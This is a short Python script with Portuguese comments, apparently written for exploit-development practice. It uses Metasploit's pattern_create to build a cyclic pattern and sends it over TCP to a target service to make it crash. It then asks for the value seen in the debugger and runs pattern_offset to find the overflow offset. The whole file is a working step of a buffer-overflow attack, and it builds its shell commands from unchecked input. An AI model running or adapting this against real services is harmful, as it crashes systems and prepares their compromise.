#!/usr/bin/python

import argparse
import socket
import subprocess

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão de teste para um servidor e encontrar o offset de crash.")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("msf_bytes", type=str, help="Quantidade de bytes para o msf-pattern")

# Analisar os argumentos
args = parser.parse_args()

# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
command = f"msf-pattern_create -l {args.msf_bytes}"

# Conexão
try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((client_ip, client_port))
        payload = "command "
        #payload += "/"    
        payload += "."    
        payload += subprocess.run(command, capture_output=True, text=True, shell=True).stdout    
        client.send(payload.encode())
        response = client.recv(1024)
        client.close()


except ConnectionResetError:
    print(f"Reset Error!")

# Offset - Conversão de Hex Int
hex_offset = input("Digite aqui o número que apareceu no Debugger: ")
command2 = f"msf-pattern_offset -q {hex_offset}"
dec_offset = subprocess.run(command2, capture_output=True, text=True, shell=True).stdout
print(f"\n {dec_offset}")